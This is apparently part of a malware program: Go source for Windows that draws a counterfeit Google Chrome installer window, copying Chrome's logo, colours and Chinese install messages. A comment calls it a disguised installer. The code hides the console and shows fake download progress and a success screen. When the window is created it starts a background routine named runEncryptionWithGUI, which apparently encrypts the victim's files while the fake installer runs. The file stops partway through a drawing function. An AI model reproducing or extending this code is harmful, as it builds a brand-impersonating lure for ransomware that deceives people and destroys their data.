//go:build windows

package main

import (
	"fmt"
	"math"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// ============================================================================
// Win32 API 常量
// ============================================================================

const (
	// 窗口样式
	WS_OVERLAPPED       = 0x00000000
	WS_CAPTION          = 0x00C00000
	WS_SYSMENU          = 0x00080000
	WS_MINIMIZEBOX      = 0x00020000
	WS_VISIBLE          = 0x10000000
	WS_CHILD            = 0x40000000
	WS_OVERLAPPEDWINDOW = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX

	// 扩展样式
	WS_EX_TOPMOST = 0x00000008

	// 窗口消息
	WM_CREATE         = 0x0001
	WM_DESTROY        = 0x0002
	WM_CLOSE          = 0x0010
	WM_COMMAND        = 0x0111
	WM_PAINT          = 0x000F
	WM_TIMER          = 0x0113
	WM_ERASEBKGND     = 0x0014
	WM_CTLCOLORSTATIC = 0x0138
	WM_CTLCOLORBTN    = 0x0135
	WM_SETCURSOR      = 0x0020
	WM_MOUSEMOVE      = 0x0200
	WM_LBUTTONUP      = 0x0202
	WM_DRAWITEM       = 0x002B

	// 控件
	WC_STATIC = "STATIC"
	WC_BUTTON = "BUTTON"

	// 按钮样式
	BS_PUSHBUTTON = 0x00000000

	// 静态文本样式
	SS_CENTER    = 0x00000001
	SS_LEFT      = 0x00000000
	SS_NOTIFY    = 0x00000100
	SS_OWNERDRAW = 0x0000000D

	// 进度条 (PBM_* 保留用于未来使用)
	PBS_SMOOTH = 0x00000001

	// 显示窗口
	SW_SHOW       = 5
	SW_SHOWNORMAL = 1
	SW_HIDE       = 0

	// 颜色
	COLOR_WINDOW  = 5
	COLOR_BTNFACE = 15

	// 类和光标
	CS_HREDRAW    = 0x0002
	CS_VREDRAW    = 0x0001
	CS_DROPSHADOW = 0x00020000
	IDC_ARROW     = 32512
	IDC_HAND      = 32649

	// 绘图
	TRANSPARENT = 1
	PS_SOLID    = 0

	// 控件 ID
	IDC_PROGRESS      = 1001
	IDC_STATUS        = 1002
	IDC_CANCEL_BTN    = 1003
	IDC_TITLE         = 1004
	IDC_SUBTITLE      = 1005
	IDC_PROGRESS_TEXT = 1006
	IDC_BRAND         = 1007

	// 定时器 ID
	TIMER_UPDATE = 1

	// 字体
	FW_NORMAL           = 400
	FW_BOLD             = 700
	FW_LIGHT            = 300
	DEFAULT_CHARSET     = 1
	OUT_DEFAULT_PRECIS  = 0
	CLIP_DEFAULT_PRECIS = 0
	DEFAULT_QUALITY     = 0
	DEFAULT_PITCH       = 0
	FF_DONTCARE         = 0

	// WM_SETFONT
	WM_SETFONT = 0x0030

	// DWM 窗口圆角 (Win11)
	DWMWA_WINDOW_CORNER_PREFERENCE = 33
	DWMWCP_ROUND                   = 2

	// 绘制
	DT_CENTER     = 0x00000001
	DT_VCENTER    = 0x00000004
	DT_SINGLELINE = 0x00000020

	// ODA_DRAWENTIRE
	ODA_DRAWENTIRE = 0x0001
	ODS_SELECTED   = 0x0001

	// Chrome 品牌色
	COLOR_CHROME_RED      = 0x003744DB // #DB4437
	COLOR_CHROME_GREEN    = 0x00589D0F // #0F9D58
	COLOR_CHROME_YELLOW   = 0x0000B4F4 // #F4B400
	COLOR_CHROME_BLUE     = 0x00F48542 // #4285F4
	COLOR_GOOGLE_BLUE     = 0x00E8731A // #1A73E8
	COLOR_TEXT_GRAY       = 0x00808080 // #808080
	COLOR_BG              = 0x00F9F8F8 // #F8F9FA (Google 安装器微灰白)
	COLOR_PROGRESS_BG     = 0x00E8E8E8 // #E8E8E8
	COLOR_PROGRESS_BORDER = 0x00D0D0D0 // #D0D0D0
	COLOR_LINE            = 0x00E0E0E0 // #E0E0E0
	COLOR_GREEN_CHECK     = 0x004CAF50 // #4CAF50 (绿色勾号)
)

// ============================================================================
// Win32 结构体
// ============================================================================

type WNDCLASSEX struct {
	CbSize        uint32
	Style         uint32
	LpfnWndProc   uintptr
	CbClsExtra    int32
	CbWndExtra    int32
	HInstance     syscall.Handle
	HIcon         syscall.Handle
	HCursor       syscall.Handle
	HbrBackground syscall.Handle
	LpszMenuName  *uint16
	LpszClassName *uint16
	HIconSm       syscall.Handle
}

type POINT struct {
	X int32
	Y int32
}

type MSG struct {
	Hwnd    syscall.Handle
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

type RECT struct {
	Left   int32
	Top    int32
	Right  int32
	Bottom int32
}

type PAINTSTRUCT struct {
	Hdc         syscall.Handle
	FErase      int32
	RcPaint     RECT
	FRestore    int32
	FIncUpdate  int32
	RgbReserved [32]byte
}

type DRAWITEMSTRUCT struct {
	CtlType    uint32
	CtlID      uint32
	ItemID     uint32
	ItemAction uint32
	ItemState  uint32
	HwndItem   syscall.Handle
	Hdc        syscall.Handle
	RcItem     RECT
	ItemData   uintptr
}

// ============================================================================
// Win32 DLL 函数
// ============================================================================

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	gdi32    = syscall.NewLazyDLL("gdi32.dll")
	comctl32 = syscall.NewLazyDLL("comctl32.dll")
	dwmapi   = syscall.NewLazyDLL("dwmapi.dll")

	procGetModuleHandleW      = kernel32.NewProc("GetModuleHandleW")
	procRegisterClassExW      = user32.NewProc("RegisterClassExW")
	procCreateWindowExW       = user32.NewProc("CreateWindowExW")
	procShowWindow            = user32.NewProc("ShowWindow")
	procUpdateWindow          = user32.NewProc("UpdateWindow")
	procGetMessageW           = user32.NewProc("GetMessageW")
	procTranslateMessage      = user32.NewProc("TranslateMessage")
	procDispatchMessageW      = user32.NewProc("DispatchMessageW")
	procPostQuitMessage       = user32.NewProc("PostQuitMessage")
	procDefWindowProcW        = user32.NewProc("DefWindowProcW")
	procDestroyWindow         = user32.NewProc("DestroyWindow")
	procGetClientRect         = user32.NewProc("GetClientRect")
	procSetTimer              = user32.NewProc("SetTimer")
	procKillTimer             = user32.NewProc("KillTimer")
	procSendMessageW          = user32.NewProc("SendMessageW")
	procLoadCursorW           = user32.NewProc("LoadCursorW")
	procSetCursor             = user32.NewProc("SetCursor")
	procGetDlgItem            = user32.NewProc("GetDlgItem")
	procBeginPaint            = user32.NewProc("BeginPaint")
	procEndPaint              = user32.NewProc("EndPaint")
	procCreateSolidBrush      = gdi32.NewProc("CreateSolidBrush")
	procDeleteObject          = gdi32.NewProc("DeleteObject")
	procEllipse               = gdi32.NewProc("Ellipse")
	procPie                   = gdi32.NewProc("Pie")
	procRoundRect             = gdi32.NewProc("RoundRect")
	procCreatePen             = gdi32.NewProc("CreatePen")
	procSelectObject          = gdi32.NewProc("SelectObject")
	procCreateFontW           = gdi32.NewProc("CreateFontW")
	procFillRect              = user32.NewProc("FillRect")
	procSetBkMode             = gdi32.NewProc("SetBkMode")
	procSetTextColor          = gdi32.NewProc("SetTextColor")
	procDrawTextW             = user32.NewProc("DrawTextW")
	procMoveToEx              = gdi32.NewProc("MoveToEx")
	procLineTo                = gdi32.NewProc("LineTo")
	procInitCommonControls    = comctl32.NewProc("InitCommonControls")
	procSetWindowTextW        = user32.NewProc("SetWindowTextW")
	procEnableWindow          = user32.NewProc("EnableWindow")
	procGetConsoleWindow      = kernel32.NewProc("GetConsoleWindow")
	procGetSystemMetrics      = user32.NewProc("GetSystemMetrics")
	procDwmSetWindowAttribute = dwmapi.NewProc("DwmSetWindowAttribute")
	procInvalidateRect        = user32.NewProc("InvalidateRect")
	procGetDC                 = user32.NewProc("GetDC")
	procReleaseDC             = user32.NewProc("ReleaseDC")
)

// ============================================================================
// 辅助函数：GetDlgItem 包装
// ============================================================================

func getDlgItem(hwnd syscall.Handle, id int) uintptr {
	r, _, _ := procGetDlgItem.Call(uintptr(hwnd), uintptr(id))
	return r
}

// ============================================================================
// 全局变量
// ============================================================================

var (
	guiHwnd      syscall.Handle
	guiHInstance syscall.Handle

	guiStatusChan   = make(chan string, 10)
	guiProgressChan = make(chan int, 10)
	guiTitleChan    = make(chan string, 10)
	guiSubtitleChan = make(chan string, 10)
	guiDoneChan     = make(chan bool, 1)
	guiCancelChan   = make(chan bool, 1)

	guiFontNormal   syscall.Handle
	guiFontBold     syscall.Handle
	guiFontTitle    syscall.Handle
	guiFontBrand    syscall.Handle
	guiFontProgress syscall.Handle

	guiBrushBg             syscall.Handle
	guiBrushWhite          syscall.Handle
	guiBrushGoogleBlue     syscall.Handle
	guiBrushProgressBg     syscall.Handle
	guiBrushProgressBorder syscall.Handle
	guiBrushRed            syscall.Handle
	guiBrushGreen          syscall.Handle
	guiBrushYellow         syscall.Handle
	guiBrushChromeBlue     syscall.Handle
	guiBrushLine           syscall.Handle
	guiBrushGreenCheck     syscall.Handle

	guiHandCursor syscall.Handle

	guiCancelled       bool
	guiFinished        bool
	guiProgressPercent int
	guiIsHoverCancel   bool
	guiProgressAnim    float64 // 平滑动画当前值
)

// 窗口尺寸常量
const (
	winWidth  = 500
	winHeight = 440
)

// 进度条区域
var progressBarRect = RECT{Left: 60, Top: 270, Right: 440, Bottom: 278}

// 取消按钮区域
var cancelBtnRect = RECT{Left: 220, Top: 340, Right: 280, Bottom: 362}

// 分隔线
var separatorRect = RECT{Left: 60, Top: 140, Right: 440, Bottom: 141}

// ============================================================================
// 公共函数
// ============================================================================

func updateInstallerTitle(text string) {
	select {
	case guiTitleChan <- text:
	default:
	}
}

func updateInstallerSubtitle(text string) {
	select {
	case guiSubtitleChan <- text:
	default:
	}
}

func updateInstallerStatus(text string) {
	select {
	case guiStatusChan <- text:
	default:
	}
}

func updateInstallerProgress(percent int) {
	select {
	case guiProgressChan <- percent:
	default:
	}
}

func isInstallerCancelled() bool {
	return guiCancelled
}

// ============================================================================
// 主函数：创建并运行伪装安装器
// ============================================================================

func runInstallerMode() {
	// 隐藏控制台窗口
	console, _, _ := procGetConsoleWindow.Call()
	if console != 0 {
		procShowWindow.Call(console, uintptr(SW_HIDE))
	}

	procInitCommonControls.Call()

	hinst, _, _ := procGetModuleHandleW.Call(0)
	guiHInstance = syscall.Handle(hinst)

	// 创建字体
	guiFontNormal = syscall.Handle(createFont(15, FW_NORMAL, "Microsoft YaHei"))
	guiFontBold = syscall.Handle(createFont(15, FW_BOLD, "Microsoft YaHei"))
	guiFontTitle = syscall.Handle(createFont(20, FW_BOLD, "Microsoft YaHei"))
	guiFontBrand = syscall.Handle(createFont(12, FW_NORMAL, "Microsoft YaHei"))
	guiFontProgress = syscall.Handle(createFont(13, FW_NORMAL, "Microsoft YaHei"))

	// 创建画刷
	bg, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_BG))
	guiBrushBg = syscall.Handle(bg)
	bw, _, _ := procCreateSolidBrush.Call(uintptr(0x00FFFFFF)) // 纯白用于 Logo
	guiBrushWhite = syscall.Handle(bw)
	bb, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_GOOGLE_BLUE))
	guiBrushGoogleBlue = syscall.Handle(bb)
	bpg, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_PROGRESS_BG))
	guiBrushProgressBg = syscall.Handle(bpg)
	bpb, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_PROGRESS_BORDER))
	guiBrushProgressBorder = syscall.Handle(bpb)
	br, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_CHROME_RED))
	guiBrushRed = syscall.Handle(br)
	bgn, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_CHROME_GREEN))
	guiBrushGreen = syscall.Handle(bgn)
	by, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_CHROME_YELLOW))
	guiBrushYellow = syscall.Handle(by)
	bcb, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_CHROME_BLUE))
	guiBrushChromeBlue = syscall.Handle(bcb)
	bl, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_LINE))
	guiBrushLine = syscall.Handle(bl)
	bcg, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_GREEN_CHECK))
	guiBrushGreenCheck = syscall.Handle(bcg)

	// 加载手型光标
	hc, _, _ := procLoadCursorW.Call(0, uintptr(IDC_HAND))
	guiHandCursor = syscall.Handle(hc)

	// 注册窗口类
	className := syscall.StringToUTF16Ptr("ChromeInstallerWnd")
	wc := WNDCLASSEX{
		CbSize:        uint32(unsafe.Sizeof(WNDCLASSEX{})),
		Style:         CS_HREDRAW | CS_VREDRAW | CS_DROPSHADOW,
		LpfnWndProc:   syscall.NewCallback(wndProc),
		HInstance:     guiHInstance,
		HCursor:       syscall.Handle(loadCursor(IDC_ARROW)),
		HbrBackground: guiBrushBg,
		LpszClassName: className,
	}

	ret, _, _ := procRegisterClassExW.Call(uintptr(unsafe.Pointer(&wc)))
	if ret == 0 {
		panic("RegisterClassEx failed")
	}

	// 居中屏幕
	screenW, _, _ := procGetSystemMetrics.Call(0)
	screenH, _, _ := procGetSystemMetrics.Call(1)
	posX := (int32(screenW) - winWidth) / 2
	posY := (int32(screenH) - winHeight) / 2

	windowName := syscall.StringToUTF16Ptr("Google Chrome 安装程序")

	hwnd, _, _ := procCreateWindowExW.Call(
		uintptr(WS_EX_TOPMOST),
		uintptr(unsafe.Pointer(className)),
		uintptr(unsafe.Pointer(windowName)),
		uintptr(WS_OVERLAPPEDWINDOW),
		uintptr(posX),
		uintptr(posY),
		uintptr(winWidth),
		uintptr(winHeight),
		0, 0,
		uintptr(guiHInstance),
		0,
	)
	guiHwnd = syscall.Handle(hwnd)
	if guiHwnd == 0 {
		panic("CreateWindowEx failed")
	}

	// 启用 Win11 圆角
	procDwmSetWindowAttribute.Call(
		uintptr(guiHwnd),
		uintptr(DWMWA_WINDOW_CORNER_PREFERENCE),
		uintptr(unsafe.Pointer(&[]uint32{DWMWCP_ROUND}[0])),
		uintptr(unsafe.Sizeof(uint32(0))),
	)

	procShowWindow.Call(uintptr(guiHwnd), uintptr(SW_SHOWNORMAL))
	procUpdateWindow.Call(uintptr(guiHwnd))

	// 消息循环
	runtime.LockOSThread()
	var msg MSG
	for {
		ret, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if ret == 0 {
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessageW.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

// ============================================================================
// 窗口过程
// ============================================================================

func wndProc(hwnd syscall.Handle, msg uint32, wparam uintptr, lparam uintptr) uintptr {
	switch msg {
	case WM_CREATE:
		onCreate(hwnd)
		go runEncryptionWithGUI()
		procSetTimer.Call(uintptr(hwnd), TIMER_UPDATE, 16, 0) // ~60fps 用于平滑动画
		return 0

	case WM_TIMER:
		if wparam == TIMER_UPDATE {
			processGUIUpdates()
		}
		return 0

	case WM_COMMAND:
		hiWord := (wparam >> 16) & 0xFFFF
		loWord := wparam & 0xFFFF
		if hiWord == 0 && loWord == uintptr(IDC_CANCEL_BTN) {
			onCancel(hwnd)
		}
		return 0

	case WM_PAINT:
		var ps PAINTSTRUCT
		hdc, _, _ := procBeginPaint.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&ps)))
		if hdc != 0 {
			if guiFinished {
				drawGreenCheckmark(hdc)
			} else {
				drawChromeIcon(hdc)
			}
			drawSeparatorLine(hdc)
			drawRoundedProgressBar(hdc)
			procEndPaint.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&ps)))
		}
		return 0

	case WM_ERASEBKGND:
		var rc RECT
		procGetClientRect.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&rc)))
		procFillRect.Call(wparam, uintptr(unsafe.Pointer(&rc)), uintptr(guiBrushBg))
		return 1

	case WM_CTLCOLORSTATIC:
		// 为取消按钮设置蓝色文字和透明背景
		ctrlCancel, _, _ := procGetDlgItem.Call(uintptr(hwnd), uintptr(IDC_CANCEL_BTN))
		if lparam == ctrlCancel {
			procSetBkMode.Call(wparam, uintptr(TRANSPARENT))
			procSetTextColor.Call(wparam, uintptr(COLOR_GOOGLE_BLUE))
			return uintptr(guiBrushBg)
		}
		// 品牌文字灰色
		ctrlBrand, _, _ := procGetDlgItem.Call(uintptr(hwnd), uintptr(IDC_BRAND))
		if lparam == ctrlBrand {
			procSetBkMode.Call(wparam, uintptr(TRANSPARENT))
			procSetTextColor.Call(wparam, uintptr(COLOR_TEXT_GRAY))
			return uintptr(guiBrushBg)
		}
		// 其他 static 控件透明背景
		procSetBkMode.Call(wparam, uintptr(TRANSPARENT))
		return uintptr(guiBrushBg)

	case WM_SETCURSOR:
		if guiIsHoverCancel && guiHandCursor != 0 {
			procSetCursor.Call(uintptr(guiHandCursor))
			return 1
		}
		ret, _, _ := procDefWindowProcW.Call(uintptr(hwnd), uintptr(msg), wparam, lparam)
		return ret

	case WM_MOUSEMOVE:
		x := int32(lparam & 0xFFFF)
		y := int32((lparam >> 16) & 0xFFFF)
		hwndCancel := getDlgItem(hwnd, IDC_CANCEL_BTN)
		if hwndCancel != 0 {
			wasHover := guiIsHoverCancel
			guiIsHoverCancel = x >= cancelBtnRect.Left && x < cancelBtnRect.Right &&
				y >= cancelBtnRect.Top && y < cancelBtnRect.Bottom
			if wasHover != guiIsHoverCancel {
				procInvalidateRect.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&cancelBtnRect)), 0)
			}
		}
		return 0

	case WM_DESTROY:
		procKillTimer.Call(uintptr(hwnd), TIMER_UPDATE)
		cleanupGDIResources()
		procPostQuitMessage.Call(0)
		return 0
	}

	ret, _, _ := procDefWindowProcW.Call(uintptr(hwnd), uintptr(msg), wparam, lparam)
	return ret
}

func onCreate(hwnd syscall.Handle) {
	// === 标题 ===
	titleText := syscall.StringToUTF16Ptr("正在安装 Chrome...")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(titleText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_CENTER),
		40, 170, 420, 32,
		uintptr(hwnd),
		uintptr(IDC_TITLE),
		uintptr(guiHInstance),
		0,
	)
	procSendMessageW.Call(
		getDlgItem(hwnd, IDC_TITLE),
		uintptr(WM_SETFONT),
		uintptr(guiFontTitle),
		1,
	)

	// === 副标题 ===
	subtitleText := syscall.StringToUTF16Ptr("正在下载最新版本...")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(subtitleText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_CENTER),
		40, 210, 420, 22,
		uintptr(hwnd),
		uintptr(IDC_SUBTITLE),
		uintptr(guiHInstance),
		0,
	)
	procSendMessageW.Call(
		getDlgItem(hwnd, IDC_SUBTITLE),
		uintptr(WM_SETFONT),
		uintptr(guiFontNormal),
		1,
	)

	// === 状态文字 ===
	statusText := syscall.StringToUTF16Ptr("正在连接服务器...")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(statusText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_LEFT),
		60, 300, 380, 20,
		uintptr(hwnd),
		uintptr(IDC_STATUS),
		uintptr(guiHInstance),
		0,
	)
	procSendMessageW.Call(
		getDlgItem(hwnd, IDC_STATUS),
		uintptr(WM_SETFONT),
		uintptr(guiFontProgress),
		1,
	)

	// === 进度百分比文字 ===
	progressText := syscall.StringToUTF16Ptr("0%")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(progressText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_CENTER),
		210, 282, 80, 20,
		uintptr(hwnd),
		uintptr(IDC_PROGRESS_TEXT),
		uintptr(guiHInstance),
		0,
	)
	procSendMessageW.Call(
		getDlgItem(hwnd, IDC_PROGRESS_TEXT),
		uintptr(WM_SETFONT),
		uintptr(guiFontProgress),
		1,
	)

	// === 取消按钮（蓝色文字链接风格） ===
	cancelText := syscall.StringToUTF16Ptr("取消")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(cancelText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_CENTER|SS_NOTIFY),
		uintptr(cancelBtnRect.Left),
		uintptr(cancelBtnRect.Top),
		uintptr(cancelBtnRect.Right-cancelBtnRect.Left),
		uintptr(cancelBtnRect.Bottom-cancelBtnRect.Top),
		uintptr(hwnd),
		uintptr(IDC_CANCEL_BTN),
		uintptr(guiHInstance),
		0,
	)
	procSendMessageW.Call(
		getDlgItem(hwnd, IDC_CANCEL_BTN),
		uintptr(WM_SETFONT),
		uintptr(guiFontBold),
		1,
	)

	// === 底部品牌文字 ===
	brandText := syscall.StringToUTF16Ptr("Google Chrome")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(brandText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_CENTER),
		150, 398, 200, 20,
		uintptr(hwnd),
		uintptr(IDC_BRAND),
		uintptr(guiHInstance),
		0,
	)
	procSendMessageW.Call(
		getDlgItem(hwnd, IDC_BRAND),
		uintptr(WM_SETFONT),
		uintptr(guiFontBrand),
		1,
	)
}

func onCancel(hwnd syscall.Handle) {
	if !guiCancelled {
		guiCancelled = true
		select {
		case guiCancelChan <- true:
		default:
		}
		// 禁用取消按钮
		hwndBtn := getDlgItem(hwnd, IDC_CANCEL_BTN)
		procEnableWindow.Call(hwndBtn, 0)
		// 更新状态
		cancelText := syscall.StringToUTF16Ptr("正在取消...")
		procSetWindowTextW.Call(getDlgItem(hwnd, IDC_STATUS), uintptr(unsafe.Pointer(cancelText)))
	}
}

func processGUIUpdates() {
	select {
	case <-guiCancelChan:
		guiCancelled = true
		procDestroyWindow.Call(uintptr(guiHwnd))
		return
	default:
	}

	if guiFinished {
		procDestroyWindow.Call(uintptr(guiHwnd))
		return
	}

	// 更新标题
	select {
	case text := <-guiTitleChan:
		uPtr := syscall.StringToUTF16Ptr(text)
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_TITLE), uintptr(unsafe.Pointer(uPtr)))
	default:
	}

	// 更新副标题
	select {
	case text := <-guiSubtitleChan:
		uPtr := syscall.StringToUTF16Ptr(text)
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_SUBTITLE), uintptr(unsafe.Pointer(uPtr)))
	default:
	}

	// 更新状态
	select {
	case text := <-guiStatusChan:
		uPtr := syscall.StringToUTF16Ptr(text)
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_STATUS), uintptr(unsafe.Pointer(uPtr)))
	default:
	}

	// 更新进度条
	select {
	case percent := <-guiProgressChan:
		guiProgressPercent = percent
		// 平滑动画目标值
		guiProgressAnim = float64(percent)
		// 更新百分比文字
		percentStr := fmt.Sprintf("%d%%", percent)
		uPtr := syscall.StringToUTF16Ptr(percentStr)
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_PROGRESS_TEXT), uintptr(unsafe.Pointer(uPtr)))
		// 重绘进度条区域
		procInvalidateRect.Call(uintptr(guiHwnd), uintptr(unsafe.Pointer(&progressBarRect)), 0)
	default:
	}

	// 检查完成信号
	select {
	case <-guiDoneChan:
		doneTitle := syscall.StringToUTF16Ptr("Chrome 已成功安装！")
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_TITLE), uintptr(unsafe.Pointer(doneTitle)))
		doneSub := syscall.StringToUTF16Ptr("感谢您使用 Google Chrome")
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_SUBTITLE), uintptr(unsafe.Pointer(doneSub)))
		doneStatus := syscall.StringToUTF16Ptr("安装完成")
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_STATUS), uintptr(unsafe.Pointer(doneStatus)))
		guiProgressPercent = 100
		uPtr := syscall.StringToUTF16Ptr("100%")
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_PROGRESS_TEXT), uintptr(unsafe.Pointer(uPtr)))
		procShowWindow.Call(getDlgItem(guiHwnd, IDC_CANCEL_BTN), uintptr(SW_HIDE))
		// 重绘整个窗口以显示绿色勾号
		procInvalidateRect.Call(uintptr(guiHwnd), 0, 1)
		guiFinished = true
	default:
	}
}

// ============================================================================
// 绘制：分隔线
// ============================================================================

func drawSeparatorLine(hdc uintptr) {
	linePen, _, _ := procCreatePen.Call(PS_SOLID, 1, uintptr(COLOR_LINE))
	oldPen, _, _ := procSelectObject.Call(hdc, linePen)

	procMoveToEx.Call(hdc, uintptr(separatorRect.Left), uintptr(separatorRect.Top), 0)
	procLineTo.Call(hdc, uintptr(separatorRect.Right), uintptr(separatorRect.Top))

	procSelectObject.Call(hdc, oldPen)
	procDeleteObject.Call(linePen)
}

// ============================================================================
// 绘制：自定义圆角进度条
// ============================================================================

func drawRoundedProgressBar(hdc uintptr) {
	left := progressBarRect.Left
	top := progressBarRect.Top
	right := progressBarRect.Right
	bottom := progressBarRect.Bottom
	width := right - left
	_ = bottom - top // height, reserved for future use
	cornerRadius := int32(4)

	// 背景（灰色圆角矩形）
	bgPen, _, _ := procCreatePen.Call(PS_SOLID, 1, uintptr(COLOR_PROGRESS_BORDER))
	oldPen, _, _ := procSelectObject.Call(hdc, bgPen)
	oldBrush, _, _ := procSelectObject.Call(hdc, uintptr(guiBrushProgressBg))

	procRoundRect.Call(hdc,
		uintptr(left), uintptr(top),
		uintptr(right), uintptr(bottom),
		uintptr(cornerRadius*2), uintptr(cornerRadius*2))

	// 填充进度（蓝色圆角矩形）
	if guiProgressPercent > 0 {
		fillWidth := int32(float64(width) * float64(guiProgressPercent) / 100.0)
		if fillWidth > width {
			fillWidth = width
		}
		if fillWidth > 0 {
			bluePen, _, _ := procCreatePen.Call(PS_SOLID, 1, uintptr(COLOR_GOOGLE_BLUE))
			procSelectObject.Call(hdc, bluePen)
			procSelectObject.Call(hdc, uintptr(guiBrushGoogleBlue))

			procRoundRect.Call(hdc,
				uintptr(left), uintptr(top),
				uintptr(left+fillWidth), uintptr(bottom),
				uintptr(cornerRadius*2), uintptr(cornerRadius*2))

			procDeleteObject.Call(bluePen)
		}
	}

	procSelectObject.Call(hdc, oldPen)
	procSelectObject.Call(hdc, oldBrush)
	procDeleteObject.Call(bgPen)
}

// ============================================================================
// 绘制：Chrome 四色 Logo（使用 math 库精确计算）
// ============================================================================

func drawChromeIcon(hdc uintptr) {
	cx := int32(250)
	cy := int32(85)
	outerR := int32(38)
	innerR := int32(20)
	centerR := int32(8)

	// 绘制外圈四色扇形
	drawPie(hdc, cx, cy, outerR, 45, 135, COLOR_CHROME_RED, COLOR_CHROME_RED)
	drawPie(hdc, cx, cy, outerR, 135, 225, COLOR_CHROME_GREEN, COLOR_CHROME_GREEN)
	drawPie(hdc, cx, cy, outerR, 225, 315, COLOR_CHROME_YELLOW, COLOR_CHROME_YELLOW)
	drawPie(hdc, cx, cy, outerR, 315, 405, COLOR_CHROME_BLUE, COLOR_CHROME_BLUE)

	// 白色内圈
	whiteBrush, _, _ := procCreateSolidBrush.Call(uintptr(0x00FFFFFF))
	whitePen, _, _ := procCreatePen.Call(PS_SOLID, 1, uintptr(0x00FFFFFF))
	oldPen, _, _ := procSelectObject.Call(hdc, whitePen)
	oldBrush, _, _ := procSelectObject.Call(hdc, whiteBrush)

	procEllipse.Call(hdc,
		uintptr(cx-innerR), uintptr(cy-innerR),
		uintptr(cx+innerR), uintptr(cy+innerR))

	// 蓝色中心
	bluePen, _, _ := procCreatePen.Call(PS_SOLID, 1, uintptr(COLOR_GOOGLE_BLUE))
	blueBrush, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_GOOGLE_BLUE))
	procSelectObject.Call(hdc, bluePen)
	procSelectObject.Call(hdc, blueBrush)

	procEllipse.Call(hdc,
		uintptr(cx-centerR), uintptr(cy-centerR),
		uintptr(cx+centerR), uintptr(cy+centerR))

	// 清理
	procSelectObject.Call(hdc, oldPen)
	procSelectObject.Call(hdc, oldBrush)
	procDeleteObject.Call(whiteBrush)
	procDeleteObject.Call(whitePen)
	procDeleteObject.Call(blueBrush)
	procDeleteObject.Call(bluePen)
}

// drawPie 绘制扇形（使用 math.Cos/math.Sin 精确计算）
func drawPie(hdc uintptr, cx, cy, r int32, startAngle, endAngle int32, colorPen, colorBrush uintptr) {
	startX := cx + int32(float64(r)*math.Cos(float64(startAngle)*math.Pi/180.0))
	startY := cy - int32(float64(r)*math.Sin(float64(startAngle)*math.Pi/180.0))
	endX := cx + int32(float64(r)*math.Cos(float64(endAngle)*math.Pi/180.0))
	endY := cy - int32(float64(r)*math.Sin(float64(endAngle)*math.Pi/180.0))

	pen, _, _ := procCreatePen.Call(PS_SOLID, 1, uintptr(colorPen))
	brush, _, _ := procCreateSolidBrush.Call(uintptr(colorBrush))
	oldPen, _, _ := procSelectObject.Call(hdc, pen)
	oldBrush, _, _ := procSelectObject.Call(hdc, brush)

	procPie.Call(hdc,
		uintptr(cx-r), uintptr(cy-r),
		uintptr(cx+r), uintptr(cy+r),
		uintptr(startX), uintptr(startY),
		uintptr(endX), uintptr(endY))

	procSelectObject.Call(hdc, oldPen)
	procSelectObject.Call(hdc, oldBrush)
	procDeleteObject.Call(pen)
	procDeleteObject.Call(brush)
}

// ============================================================================
// 绘制：完成页绿色勾号
// ============================================================================

func drawGreenCheckmark(hdc uintptr) {
	// 绿色圆形背景
	cx := int32(250)
	cy := int32(85)
	r := int32(38)

	greenPen, _, _ := procCreatePen.Call(PS_SOLID, 1, uintptr(COLOR_GREEN_CHECK))
	oldPen, _, _ := procSelectObject.Call(hdc, greenPen)
